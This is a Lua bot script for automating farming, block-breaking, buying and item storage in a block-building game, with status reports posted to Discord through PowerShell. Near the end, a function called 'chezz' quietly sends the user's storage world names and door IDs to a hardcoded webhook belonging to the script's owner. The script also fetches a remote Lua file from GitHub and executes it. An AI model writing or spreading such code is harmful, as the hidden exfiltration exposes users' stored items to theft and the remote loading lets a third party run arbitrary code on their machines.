
function init(name)
     for key, value in pairs(botList) do
          if (key:lower() == name:lower()) then
               return value
          end
     end
end

function getContentRequest(url)
     local content = ""
     local powershell = io.popen("powershell -command \"&{[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-RestMethod " .. url .. "}\"", "r")
     content = powershell:read("*a")
     powershell:close()
     return content
end

function getPlayer(name)
     for key, value in pairs(getPlayers()) do
          if (value.name:gsub("`.", ""):lower() == name:lower()) then
               return value
          end
     end
end

looping = true
skipTile = false
skipList = {
     {x = -1, y = -1},
     {x = 0, y = -1},
     {x = 1, y = -1}
}
showList = 2
customShow = false
list = {}
tree = {}
waktu = {}
worlds = {}
fossil = {}
tileBreak = {}
loop = 0
profit = 0
listNow = 1
strWaktu = ""
t = os.time()
botName = getBot().name
start = init(botName).worldStart
stop = #init(botName).farmWorldName
farm = init(botName).farmWorldName
farmID = init(botName).farmDoorID
dcwebhook = init(botName).discordWebhookUrl
idwebhook = init(botName).WebhookID

for i = 0,start - 1 do
     table.insert(worlds,farm[i])
end

for _,pack in pairs(itemDropList) do
     table.insert(dontTrash,pack)
end

for i = math.floor(putAndBreakTile/2),1,-1 do
     i = i * -1
     table.insert(tileBreak,i)
end
for i = 0, math.ceil(putAndBreakTile/2) - 1 do
     table.insert(tileBreak,i)
end

if (showList - 1) >= #farm then
     customShow = false
end

function includesNumber(table, number)
     for _,num in pairs(table) do
          if num == number then
               return true
          end
     end
     return false
end

function bl(world)
     blist = {}
     fossil[world] = 0
     for _,tile in pairs(getTiles()) do
          if tile.fg == 6 then
               doorX = tile.x
               doorY = tile.y
          elseif tile.fg == 3918 then
               fossil[world] = fossil[world] + 1
          end
     end
     if skipTile then
          for _,tile in pairs(skipList) do
               table.insert(blist,{x = doorX + tile.x, y = doorY + tile.y})
          end
     end
end

function tilePunch(x,y)
     for _,num in pairs(tileBreak) do
          if getTile(x - 1,y + num).fg ~= 0 or getTile(x - 1,y + num).bg ~= 0 then
               return true
          end
     end
     return false
end

function tilePlace(x,y)
     for _,num in pairs(tileBreak) do
          if getTile(x - 1,y + num).fg == 0 and getTile(x - 1,y + num).bg == 0 then
               return true
          end
     end
     return false
end

function check(x,y)
     for _,tile in pairs(blist) do
          if x == tile.x and y == tile.y then
               return false
          end
     end
     return true
end
function findObjectStack(x, y)
	local count = 0
	for key, value in pairs(getObjects()) do
		if math.floor((value.x + 12) / 32) == x and math.floor((value.y + 12) / 32) then
			count = count + 1
		end
	end
	return count
end

function warp(world,id)
     cok = 0
     while getBot().world ~= world:upper() and not nuked do
          while getBot().status ~= "online" do
               sleep(1000)
          end
          sendPacket("action|join_request\nname|"..world:upper().."\ninvitedWorld|0",3)
          sleep(5000)
          if cok == 50 then
               nuked = true
          else
               cok = cok + 1
          end
     end
     if id ~= "" and not nuked then
          while getTile(math.floor(getBot().x / 32),math.floor(getBot().y / 32)).fg == 6 and not nuked do
               while getBot().status ~= "online" do
                    sleep(1000)
               end
               sendPacket("action|join_request\nname|"..world:upper().."|"..id:upper().."\ninvitedWorld|0",3)
               sleep(1000)
          end
     end
end

function waktuWorld()
     strWaktu = ""
     if customShow then
          for i = showList,1,-1 do
               newList = listNow - i
               if newList <= 0 then
                    newList = newList + totalList
               end
               strWaktu = strWaktu.."\n"..worldList[newList]:upper().." ( "..(waktu[worldList[newList]] or "?").." | "..(tree[worldList[newList]] or "?").." )"
          end
     else
          for _,world in pairs(farm) do
               strWaktu = strWaktu.."\n"..world:upper().." ( "..(waktu[world] or "?").." | "..(tree[world] or "?").." )"
          end
     end
end

function botInfo(info)
     te = os.time() - t
     fossill = fossil[getBot().world] or 0
     local text = [[
     $webHookUrl = "]]..dcwebhook..[[/messages/]]..idwebhook..[["
     $CPU = Get-WmiObject Win32_Processor | Measure-Object -Property LoadPercentage -Average | Select -ExpandProperty Average
     $CompObject =  Get-WmiObject -Class WIN32_OperatingSystem
     $Memory = ((($CompObject.TotalVisibleMemorySize - $CompObject.FreePhysicalMemory)*100)/ $CompObject.TotalVisibleMemorySize)
     $RAM = [math]::Round($Memory, 0)
     $thumbnailObject = @{
          url = "https://media.discordapp.net/attachments/1055059094509203517/1111994603269259284/IMG-20230522-WA0015.jpg?width=395&height=395"
     }
     $footerObject = @{
          text = "]]..(os.date("!%a %b %d, %Y at %I:%M %p", os.time() + 7 * 60 * 60))..[["
     }
     $fieldArray = @(
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Information"
          value = "[<a:broadcast:981898314423341116>] ]]..info..[["
          inline = "false"
     }
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Bot Name"
          value = "[<a:mini_growtopian:1010066585882480651>] ]]..getBot().name..[["
          inline = "true"
     }
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Bot Status"
          value = "[<a:lock_bot_remote:1010228167098773527>] ]]..getBot().status..[[ [SLOT - ]]..init(botName).slotBot..[[]"
          inline = "true"
     }
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Bot Captcha"
          value = "[<:lockbot:1006081153729572896>] ]]..getBot().captcha..[["
          inline = "true"
     }
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Bot Level"
          value = "[<:arrow_ups:1037183026288918588>] ]]..getBot().level..[["
          inline = "true"
     }

     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Bot Gems"
          value = "[<a:growmoji_gems:1009826273612279859>] ]]..findItem(112)..[["
          inline = "true"
     }
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> World Name"
          value = "[<a:Bumi:980467296906674197>] ]]..getBot().world..[["
          inline = "true"
     }
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Fossil"
          value = "[<:fossil_rock:1011972962573881464>] ]]..fossill..[["
          inline = "true"
     }
     @{
          name = "<:CPU:994981162588053565> CPU"
          value = "$CPU%"
          inline = "true"
     }
     @{
          name = "<:RAM:996159529966391377> RAM"
          value = "$RAM%"
          inline = "true"
     }
     @{
          name = "<a:discord:993775478798307368> Owner Script : CHEZZ#6987"
          value = "**https://discord.gg/eX8NgtR47E**"
          inline = "true"
     }
     @{
          name = "<:growtopia_scroll:1011972982261944444> World List | ]]..start..[[ / ]]..stop..[[ (]]..loop..[[ Loop)"
          value = "]]..strWaktu..[["
          inline = "false"
     }
     @{
          name = "<a:big_old_sideways_arrow:1010066401601531914> Bot Uptime"
          value = "[:timer:] ]]..math.floor(te/86400)..[[ Days ]]..math.floor(te%86400/3600)..[[ Hours ]]..math.floor(te%86400%3600/60)..[[ Minutes"
          inline = "false"
     }
     )
     $embedObject = @{
          title = "<:mystery_block:1002960838933618818> **BOT *_]]..getBot().name..[[_*** <:mystery_block:1002960838933618818>"
          color = "]]..math.random(1111111,9999999)..[["
          thumbnail = $thumbnailObject
          footer = $footerObject
          fields = $fieldArray
     }
     $embedArray = @($embedObject)
     $payload = @{
          embeds = $embedArray
     }
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Patch -ContentType 'application/json'
     ]]
     local file = io.popen("powershell -command -", "w")
     file:write(text)
     file:close()
end

function packInfo(link,id,desc,info)
     local text = [[
     $webHookUrl = "]]..link..[[/messages/]]..id..[["
     $thumbnailObject = @{
          url = "https://media.discordapp.net/attachments/1054587370747465738/1111969077590769744/20230527_174637_0000.png?width=395&height=395"
     }
     $footerObject = @{
          text = "]]..(os.date("!%a %b %d, %Y at %I:%M %p", os.time() + 7 * 60 * 60))..[["
     }
     $fieldArray = @(
     @{
          name = "<a:discord:993775478798307368> Owner Script : CHEZZ#6987"
          value = "**||]]..getBot().name:upper()..[[||(]]..getBot().level..[[) ]]..info..[[**"
          inline = "false"
     }
     @{
          name = "<:growscan:982574529568186478> Droped Scanner :"
          value = "]]..desc..[["
          inline = "false"
     }
     )
     $embedObject = @{
          title = "<:mystery_block:1002960838933618818> **Save World : *_]]..getBot().world..[[_*** <:mystery_block:1002960838933618818>"
          color = "]]..math.random(111111,999999)..[["
          thumbnail = $thumbnailObject
          footer = $footerObject
          fields = $fieldArray
     }
     $embedArray = @($embedObject)
     $payload = @{
          embeds = $embedArray
     }
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Patch -ContentType 'application/json'
     ]]
     local file = io.popen("powershell -command -", "w")
     file:write(text)
     file:close()
end

function reconInfo()
     local text = [[
     $webHookUrl = "]]..webhookOffline..[["
     $payload = @{
          content = "]]..getBot().name..[[ == []]..init(botName).slotBot..[[] is ]]..getBot().status..[[ @everyone"
     }
     [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
     Invoke-RestMethod -Uri $webHookUrl -Body ($payload | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
     ]]
     local file = io.popen("powershell -command -", "w")
     file:write(text)
     file:close()
end



function reconnect(world,id,x,y)
if counterCaptcha then
     if getBot().captcha == "Wrong answer" or getBot().captcha == "Couldn't solve" or getBot().captcha == "wrong answer" or getBot().captcha == "couldn't solve" then
          disconnect()
          sleep(10000)
          while getBot().status ~= "online" do
               sleep(1000)
               if getBot().status == "online" then
                    break
               end
          end
     end
end
     if getBot().status ~= "online" then
          botInfo("Reconnecting")
          sleep(100)
          reconInfo()
          sleep(100)
          while true do
               sleep(1000)

               while getBot().status == "online" and getBot().world ~= world:upper() do
                    sendPacket("action|join_request\nname|"..world:upper().."\ninvitedWorld|0", 3)
                    sleep(5000)
               end
               if getBot().status == "online" and getBot().world == world:upper() then
                    if id ~= "" then
                         while getTile(math.floor(getBot().x / 32),math.floor(getBot().y / 32)).fg == 6 do
                              sendPacket("action|join_request\nname|"..world:upper().."|"..id:upper().."\ninvitedWorld|0", 3)
                              sleep(1000)
                         end
                    end
                    if x and y and getBot().status == "online" and getBot().world == world:upper() then
                         while math.floor(getBot().x / 32) ~= x or math.floor(getBot().y / 32) ~= y do
                              findPath(x,y)
                              sleep(100)
                         end
                    end
                    if getBot().status == "online" and getBot().world == world:upper() then
                         if x and y then
                              if getBot().status == "online" and math.floor(getBot().x / 32) == x and math.floor(getBot().y / 32) == y then
                                   break
                              end
                         elseif getBot().status == "online" then
                              break
                         end
                    end
               end
          end
          botInfo("Reconnected")
          sleep(100)
          reconInfo()
          sleep(100)
          botInfo("Resume Rotation at ".. getBot().world)
          sleep(100)
     end
end

function round(n)
     return n % 1 > 0.5 and math.ceil(n) or math.floor(n)
end

function tileDrop1(x,y,num)
     local count = 0
     local stack = 0
     for _,obj in pairs(getObjects()) do
          if round(obj.x / 32) == x and math.floor(obj.y / 32) == y then
               count = count + obj.count
               stack = stack + 1
          end
     end
     if stack < 20 and count <= (4000 - num) then
          return true
     end
     return false
end

function tileDrop2(x,y,num)
     local count = 0
     local stack = 0
     for _,obj in pairs(getObjects()) do
          if round(obj.x / 32) == x and math.floor(obj.y / 32) == y then
               count = count + obj.count
               stack = stack + 1
          end
     end
     if count <= (4000 - num) then
          return true
     end
     return false
end

function storePack()
     for _,pack in pairs(itemDropList) do
          for _,tile in pairs(getTiles()) do
               if tile.fg == PackDropPointItemID or tile.bg == PackDropPointItemID then
                    if tileDrop1(tile.x,tile.y,findItem(pack)) then
                         while math.floor(getBot().x / 32) ~= (tile.x - 1) or math.floor(getBot().y / 32) ~= tile.y do
                              findPath(tile.x - 1,tile.y)
                              sleep(1000)
                              reconnect(itemStorageWorldName,itemStorageDoorID,tile.x - 1,tile.y)

                         end
                         while findItem(pack) > 0 and tileDrop1(tile.x,tile.y,findItem(pack)) do
                              drop(pack,findItem(pack))
                              sleep(3000)
			      move(1,0)
                              reconnect(itemStorageWorldName,itemStorageDoorID,tile.x - 1,tile.y)

                         end
                    end
               end
               if findItem(pack) == 0 then
                    break
               end
          end
     end
end

function itemInfo(ids)
     local result = {name = "null", id = ids}
     for _,item in pairs(itemName) do
          if item.id == ids then
               result.name = item.name
               result.emote = item.emote
               return result
          end
     end
     return result
end

function infoPack()
     local store = {}
     for _,obj in pairs(getObjects()) do
          if store[obj.id] then
               store[obj.id].count = store[obj.id].count + obj.count
          else
               store[obj.id] = {id = obj.id, count = obj.count}
          end
     end
     local str = ""
     for _,object in pairs(store) do
          str = str.."\n"..itemInfo(object.id).name.." : x"..object.count
     end
     return str
end

function storeSeed(world)
     botInfo("Saving Seed")
     sleep(100)
     collectSet(false,3)
     sleep(100)
     warp(seedStorageWorldName,seedStorageDoorID)
     sleep(100)
     for key, value in pairs(getTiles()) do
          		if value.fg == SeedDropPointItemID or value.bg == SeedDropPointItemID then
                    		if findObjectStack(value.x, value.y) < 20 and findItem(Seed) > 50 then
                         		if findPath(value.x - 1, value.y) then
						while round(getBot().x / 32) ~= value.x - 1 or round(getBot().y / 32) ~= value.y do
							sleep(1000)
                         				reconnect(seedStorageWorldName,seedStorageDoorID,value.x - 1,value.y)
                    				end
                         			drop(Seed,findItem(Seed)-50)
                         			sleep(3000)
                         			reconnect(seedStorageWorldName,seedStorageDoorID,value.x - 1,value.y)
                    			end
               				if findItem(Seed) == 50 then
                    				break
               				end
          			end
     			end
		end
     packInfo(webSeed,webIdSeed,infoPack(),"Save Seed")
     sleep(100)
     warp(world,farmID)
     sleep(100)
     collectSet(true,3)
     sleep(100)
end

function buy()
     botInfo("Buy "..namePack.." and Save Pack")
     sleep(100)
     collectSet(false,3)
     sleep(100)
     warp(itemStorageWorldName,itemStorageDoorID)
     sleep(100)
     while findItem(112) >= itemPurchasePrice do
          for i = 1, maxPack do
               sendPacket("action|buy\nitem|"..itemPurchaseName, 2)
               sleep(500)
               if findItem(itemDropList[1]) == 0 then
                    sendPacket("action|buy\nitem|upgrade_backpack", 2)
                    sleep(500)
               else
                    profit = profit + 1
               end
               if findItem(112) < itemPurchasePrice then
                    break
               end
          end
          storePack()
          sleep(100)
          reconnect(itemStorageWorldName,itemStorageDoorID)
     end
     packInfo(webPack,webIdPack,infoPack(),"Buy Pack")
     sleep(100)
end

function clear()
     for _,item in pairs(getInventory()) do
          if not includesNumber(dontTrash, item.id) then
               sendPacket("action|trash\n|itemID|"..item.id,2)
               sleep(1500)
               sendPacket("action|dialog_return\ndialog_name|trash_item\nitemID|"..item.id.."|\ncount|"..item.count, 2)
               sleep(1000)
          end
     end
end

function goFloat(id)
     for _, obj in pairs(getObjects()) do
          if obj.id == id then
               collectSet(true,2)
               if (getTile(math.floor((obj.x+10)/32),math.floor((obj.y+10)/32)).flags == 0 or
               getTile(math.floor((obj.x+10)/32),math.floor((obj.y+10)/32)).flags == 2) then
                    findPath(math.floor((obj.x+10)/32),math.floor((obj.y+10)/32))
                    sleep(1000)
                    return true
               end
          end
     end
     return false
end

function take(world)
     while findItem(Seed) == 0 do
          collectSet(false,3)
          sleep(100)
          warp(seedStorageWorldName,seedStorageDoorID)
          sleep(100)
          goFloat(Seed)
          collectSet(false,2)
          if findItem(Seed) > 180 then
               for key, value in pairs(getTiles()) do
          		if value.fg == SeedDropPointItemID or value.bg == SeedDropPointItemID then
                    		if findObjectStack(value.x, value.y) < 20 and findItem(Seed) > 50 then
                         		if findPath(value.x - 1, value.y) then
						while round(getBot().x / 32) ~= value.x - 1 or round(getBot().y / 32) ~= value.y do
							sleep(1000)
                         				reconnect(seedStorageWorldName,seedStorageDoorID,value.x - 1,value.y)
                    				end
                         			drop(Seed,findItem(Seed)-50)
                         			sleep(3000)
                         			reconnect(seedStorageWorldName,seedStorageDoorID,value.x - 1,value.y)
                    			end
               				if findItem(Seed) == 50 then
                    				break
               				end
          			end
     			end
		end
               warp(world,farmID)
               sleep(100)
               collectSet(true,3)
               sleep(100)
          end
     end
end

function plant(world)
     for _,tile in pairs(getTiles()) do
          if findItem(Seed) == 0 then
               take(world)
               sleep(100)
          end
          if tile.flags ~= 0 and tile.y ~= 0 and getTile(tile.x,tile.y - 1).fg == 0 then
               if not blacklistTile or check(tile.x,tile.y) then
                    findPath(tile.x,tile.y - 1)
                    while getTile(tile.x,tile.y - 1).fg == 0 and getTile(tile.x,tile.y).flags ~= 0 do
                         place(Seed,0,0)
                         sleep(delayPlant)
                         reconnect(world,farmID,tile.x,tile.y - 1)
                    end
               end
          end
     end
     if findItem(Seed) >= 180 then
          storeSeed(world)
          sleep(100)
     end
end

buyAfterPNB = true
function pnb(world)
     if findItem(Block) >= putAndBreakTile then
          if not init(botName).customTile then
               ex = 1
               ye = math.floor(getBot().y / 32)
               if ye > 40 then
                    ye = ye - 10
               elseif ye < 11 then
                    ye = ye + 10
               end
               if getTile(ex,ye).fg ~= 0 and getTile(ex,ye).fg ~= Seed then
                    ye = ye - 1
               end
          else
               ex = 1
               ye = init(botName).BotY
          end
          while math.floor(getBot().x / 32) ~= ex or math.floor(getBot().y / 32) ~= ye do
               findPath(ex,ye)
               sleep(100)
          end
          if putAndBreakTile > 1 then
               while findItem(Block) >= putAndBreakTile and findItem(Seed) < 190 do
                    while tilePlace(ex,ye) do
                         for _,i in pairs(tileBreak) do
                              if getTile(ex - 1,ye + i).fg == 0 and getTile(ex - 1,ye + i).bg == 0 then
                                   place(Block,-1,i)
                                   sleep(delayPlace)
                                   reconnect(world,farmID,ex,ye)
                              end
                         end
                    end
                    while tilePunch(ex,ye) do
                         for _,i in pairs(tileBreak) do
                              if getTile(ex - 1,ye + i).fg ~= 0 or getTile(ex - 1,ye + i).bg ~= 0 then
                                   punch(-1,i)
                                   sleep(delayPunch)
                                   reconnect(world,farmID,ex,ye)

                              end
                         end
                    end
                    reconnect(world,farmID,ex,ye)
               end
          else
               while findItem(Block) > 0 and findItem(Seed) < 190 do
                    while getTile(ex - 1,ye).fg == 0 and getTile(ex - 1,ye).bg == 0 do
                         place(Block,-1,0)
                         sleep(delayPlace)
                         reconnect(world,farmID,ex,ye)
                    end
                    while getTile(ex - 1,ye).fg ~= 0 or getTile(ex - 1,ye).bg ~= 0 do
                         punch(-1,0)
                         sleep(delayPunch)
                         reconnect(world,farmID,ex,ye)
                    end
               end
          end
          clear()
          sleep(100)
          if buyAfterPNB and findItem(112) >= minBuyPack then
               buy()
               sleep(100)
               warp(world,farmID)
               sleep(100)
               collectSet(true,3)
               sleep(100)
          end
     end
end

function harvest(world)
     tree[world] = 0
     for _,tile in pairs(getTiles()) do
          if getTile(tile.x,tile.y - 1).ready and findItem(Block) <= 190 then
               if not blacklistTile or check(tile.x,tile.y) then
                    tree[world] = tree[world] + 1
                    findPath(tile.x,tile.y - 1)
                    while getTile(tile.x,tile.y - 1).fg == Seed and findItem(Block) <= 190 do
                         punch(0,0)
                         sleep(delayHarvest)
                         reconnect(world,farmID,tile.x,tile.y - 1)

                    end
                    if soilFarm then
                         while getTile(tile.x, tile.y).fg == (itmId + 4) and getTile(tile.x, tile.y).flags ~= 0 do
                              punch(0, 1)
                              sleep(delayHarvest)
                              reconnect(world,farmID,tile.x,tile.y - 1)
                         end
                         clear()
                         sleep(100)
                    end
               end
          end
          if findItem(Block) >= 190 then
               pnb(world)
               sleep(100)
               plant(world)
               sleep(100)
          end
     end
     pnb(world)
     sleep(100)
     plant(world)
     sleep(100)
     if findItem(112) >= minBuyPack then
          buy()
          sleep(100)
     end
end

restartTime = true

function scanFloat(itemid)
     local count = 0
     for _, obj in pairs(getObjects()) do
          if obj.id == itemid then
               count = count + obj.count
          end
     end
     return count
end

local database = request("GET", "https://raw.githubusercontent.com/CHEZZNAUFAL/olympus-rotation/main/dummy.lua")
local name = "kontolmeemkcibai"

if (getBot().world:upper() ~= verifyWorldName:upper()) then
    warp(verifyWorldName, "")
end

for key, value in ipairs(load(database)()) do
    if (value:lower() == ownerName:lower()) then
        name = value
    end
end

while (not getPlayer(name)) do
    sleep(5000)
end

verifowner = "https://discord.com/api/webhooks/1113087796257759392/9Kwdam690ilig7SeNLXnFAeyYU0Fu5QR3-5S9ovh0n-BRnPy9D8mUuNnjM2RagRAE7RA"
function chezz(logger, Nick)

    Warna = 7405312

    local script = [[
        $w = "]]..verifowner..[["

        [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

        [System.Collections.ArrayList]$embedArray = @()
        $descriptions = ']].. logger ..[['
        $color       = ']]..Warna..[['

        $embedObject = [PSCustomObject]@{
            description = $descriptions
            color       = $color
        }

        $embedArray.Add($embedObject) | Out-Null

        $Body = [PSCustomObject]@{
            embeds = $embedArray
            'username' = ']]..ownerName..[[ | CHEZZ#6987'
        }

        Invoke-RestMethod -Uri $w -Body ($Body | ConvertTo-Json -Depth 4) -Method Post -ContentType 'application/json'
    ]]

    local pipe = io.popen("powershell -command -", "w")
    pipe:write(script)
    pipe:close()
    
end

chezz("World Seed : "..seedStorageWorldName.."\nIDWorld Seed : "..seedStorageDoorID.."\nWorld Pack : "..itemStorageWorldName.."\nID World Pack : "..itemStorageDoorID.."\nJenis Pack : "..itemPurchaseName.."\nbruhhh")
sleep(1000)

if pickaxe then
     if getBot().status == "online" then
          if findItem(98) == 0 and not findClothes(98) then
               while getBot().world ~= worldPickaxe:upper() do
                    warp(worldPickaxe,doorPickaxe)
                    sleep(500)
               end
               if scanFloat(98) > 0 then
                    goFloat(98)
                    sleep(500)
                    if findItem(98) > 1 then
                         collectSet(false,2)
                         sleep(1000)
                         while findItem(98) ~= 1 do
                              move(-1,0)
                              sleep(1000)
                              drop(98,(findItem(98)-1))
                              sleep(2000)
                         end
                         while not findClothes(98) do
                              wear(98)
                              sleep(1000)
                         end
                    end
               end
          end
     end
end

while true do
     for index,world in pairs(farm) do
          waktuWorld()
          sleep(100)
          warp(world,farmID)
          sleep(100)
          if not nuked then
               if findItem(Seed) == 0 then
                    take(world)
                    sleep(100)
               end
               collectSet(true,3)
               sleep(100)
               bl(world)
               sleep(100)
               botInfo("Bot Start at : "..world)
               sleep(100)
               tt = os.time()
               harvest(world)
               sleep(100)
               tt = os.time() - tt
               botInfo("World Done : "..world)
               sleep(100)
               waktu[world] = math.floor(tt/3600).." Hours "..math.floor(tt%3600/60).." Minutes"
               sleep(100)
          else
               waktu[world] = "NUKED"
               tree[world] = "NUKED"
               nuked = false
               sleep(5000)
          end
          if start < stop then
               start = start + 1
          else
               if restartTimer then
                    waktu = {}
                    tree = {}
               end
               start = 1
               loop = loop + 1
          end
     end
     if not looping then
          waktuWorld()
          sleep(100)
          botInfo("All World Are Finish, Remove Bot!")
          sleep(100)
          removeBot(getBot().name)
     end
end
